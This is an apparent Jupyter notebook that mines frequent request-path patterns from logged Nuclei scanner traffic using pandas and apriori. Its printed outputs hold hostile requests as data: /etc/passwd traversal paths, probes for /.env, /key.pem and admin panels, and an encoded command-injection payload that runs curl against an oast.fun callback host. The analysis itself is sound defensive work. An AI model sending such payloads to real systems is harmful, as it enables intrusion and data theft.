# %%
import pandas as pd

df = pd.read_json("../../datas/nuclei/detected.json", lines=True)

df.head(5)
# Out:
#   method                                               path  \
# 0    GET                                                  /
# 1   HEAD                                                  /
# 2    GET  /servlet/codesettree?flag=c&status=1&codesetid...
# 3   POST                                  /WEB_VMS/LEVEL15/
# 4   POST                            /zentao/user-login.html
#
#                                              headers  \
# 0  {'host': '127.0.0.1', 'user-agent': 'curl/7.81...
# 1  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 2  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 3  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 4  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
#
#                                    uuid                                 peer  \
# 0  4d001351-3ab5-4ebe-b891-97c5ef3d1bac  {'ip': '172.18.0.1', 'port': 47064}
# 1  4d001351-3ab5-4ebe-b891-97c5ef3d1bac  {'ip': '172.18.0.1', 'port': 58566}
# ...

# %%
# get the paths with params
# filtered_paths = filtered_df["path"]

# get the paths without params
df["path"] = df["path"].apply(lambda x: x.split('?', 1)[0])

df.head(5)
# Out:
#   method                     path  \
# 0    GET                        /
# 1   HEAD                        /
# 2    GET     /servlet/codesettree
# 3   POST        /WEB_VMS/LEVEL15/
# 4   POST  /zentao/user-login.html
#
#                                              headers  \
# 0  {'host': '127.0.0.1', 'user-agent': 'curl/7.81...
# 1  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 2  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 3  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
# 4  {'host': '127.0.0.1', 'user-agent': 'Mozilla/5...
#
#                                    uuid                                 peer  \
# 0  4d001351-3ab5-4ebe-b891-97c5ef3d1bac  {'ip': '172.18.0.1', 'port': 47064}
# 1  4d001351-3ab5-4ebe-b891-97c5ef3d1bac  {'ip': '172.18.0.1', 'port': 58566}
# 2  4d001351-3ab5-4ebe-b891-97c5ef3d1bac  {'ip': '172.18.0.1', 'port': 58590}
# 3  4d001351-3ab5-4ebe-b891-97c5ef3d1bac  {'ip': '172.18.0.1', 'port': 58584}
# ...

# %%
paths_matrix = []
tmp = []
sess_uuids_paths = {
  # "{sess_uuid}": []
}
sess_uuids = []

for _, row in df.iterrows():
  sess_uuid = row.get("cookies", {}).get("sess_uuid") or row.get("response_msg", {}).get("response", {}).get("message", {}).get("sess_uuid")
  path = row["path"]

  if sess_uuid in sess_uuids:
    sess_uuids_paths[sess_uuid].append(path)
  else:
    sess_uuids_paths[sess_uuid] = [path]
    sess_uuids.append(sess_uuid)

paths_matrix = list(sess_uuids_paths.values())
# for paths in sess_uuids_paths.values():
#   paths_matrix.append(paths)

sess_uuids_paths
# paths_matrix
# print(len(paths_matrix), len(sess_uuids_paths.keys()))
# Out:
# {'5c03d747-efc4-417c-9ab2-87a504285fb5': ['/'],
#  'a7eb06e3-388a-436c-af5c-1778a2b34e3d': ['/',
#   '/wp-admin/options-general.php',
#   '/',
#   '/server-common/cgi-bin/login',
#   '/lucee/admin/web.cfm',
#   '/wp-content/plugins/header-footer-code-manager/readme.txt',
#   '/login/login.htm',
#   '/app/webroot/files/kcfinder/files/home/000~ROOT~000/etc/passwd'],
#  '481b180f-6499-4636-a881-d1b5948991e4': ['/servlet/codesettree',
#   '/',
#   '/2ydOhck1UM0KaMXfiTNxaf6Q2zy',
#   '/api/v1/database/2',
#   '/libs/granite/core/content/login.html/j_security_check',
#   '/manager/html',
#   '/key.pem',
#   '/webapps.jar',
#   '/',
#   '/identification.php',
#   '/wp-content/plugins/wp-easycart/inc/admin/phpinfo.php'],
#  'aa449b70-96de-4a22-8bbb-816a1491958e': ['/WEB_VMS/LEVEL15/',
#   '/whoAmI/',
#   '/wls-wsat/CoordinatorPortType',
#   '/include/dialog/select_templets.php',
#   '/manager/html',
#   '/plus/flink.php',
#   '/wp-json/oembed/1.0/proxy',
# ...

# %%
from mlxtend.preprocessing import TransactionEncoder

te = TransactionEncoder()
te_ary = te.fit(paths_matrix).transform(paths_matrix)
df = pd.DataFrame(te_ary, columns=te.columns_)

df
# Out:
#          /  /%00/oast.me/  \
# 0     True          False
# 1     True          False
# 2     True          False
# 3    False          False
# 4     True          False
# ..     ...            ...
# 922   True          False
# 923  False          False
# 924  False          False
# 925  False          False
# 926  False          False
#
#      /%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://d18ldk1q6jvtu03h7no0b3wt9pbq7w836.oast.fun+-H+%27User-Agent:+XWdIg9%27%7D;%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;%7Bcurl,http://d18ldk1q6jvtu03h7no0osaujecoksbw6.oast.fun+-H+%27User-Agent:+XWdIg9%27%7D;  \
# 0                                                False
# 1                                                False
# 2                                                False
# 3                                                False
# 4                                                False
# ..                                                 ...
# ...

# %%
from mlxtend.frequent_patterns import apriori

freq_itemsets = apriori(df, use_colnames=True, min_support=0.002)

freq_itemsets
# Out:
#       support                                           itemsets
# 0    0.463862                                                (/)
# 1    0.002157  (/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2...
# 2    0.002157           (/../../../../../../../../../etc/passwd)
# 3    0.003236                                  (/.children.json)
# 4    0.005394                                            (/.env)
# ..        ...                                                ...
# 792  0.002157            (/index.php, /manager/html, /login.php)
# 793  0.002157  (/index.php, /manager/html, /product-details.php)
# 794  0.002157  (/index.php, /wp-admin/admin-ajax.php, /manage...
# 795  0.002157  (/manager/html, /wp-admin/admin-ajax.php, /log...
# 796  0.002157         (/index.php, /manager/html, /login.php, /)
#
# [797 rows x 2 columns]

# %%
freq_itemsets['length'] = freq_itemsets['itemsets'].apply(lambda x: len(x))
freq_itemsets
# Out:
#       support                                           itemsets  length
# 0    0.463862                                                (/)       1
# 1    0.002157  (/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2...       1
# 2    0.002157           (/../../../../../../../../../etc/passwd)       1
# 3    0.003236                                  (/.children.json)       1
# 4    0.005394                                            (/.env)       1
# ..        ...                                                ...     ...
# 792  0.002157            (/index.php, /manager/html, /login.php)       3
# 793  0.002157  (/index.php, /manager/html, /product-details.php)       3
# 794  0.002157  (/index.php, /wp-admin/admin-ajax.php, /manage...       3
# 795  0.002157  (/manager/html, /wp-admin/admin-ajax.php, /log...       3
# 796  0.002157         (/index.php, /manager/html, /login.php, /)       4
#
# [797 rows x 3 columns]

# %%
freq_itemsets[freq_itemsets["length"] >= 3]
# Out:
#       support                                           itemsets  length
# 740  0.002157                    (/.env.local, /manager/html, /)       3
# 741  0.003236          (/index.php, /CDGServer3/SystemConfig, /)       3
# 742  0.003236       (/CDGServer3/SystemConfig, /manager/html, /)       3
# 743  0.002157   (/login/index.php, /Users/authenticatebyname, /)       3
# 744  0.002157                      (/_session, /manager/html, /)       3
# 745  0.002157             (/admin/index.php, /admin/ajax.php, /)       3
# 746  0.002157                  (/index.php, /admin/index.php, /)       3
# 747  0.002157                      (/index.php, /admin/login, /)       3
# 748  0.002157                   (/admin/login, /manager/html, /)       3
# 749  0.002157  (/ajax-api/2.0/mlflow/registered-models/create...       3
# 750  0.002157             (/api/v1/database/2, /manager/html, /)       3
# 751  0.002157             (/jmx-console/, /api/v1/database/5, /)       3
# ...
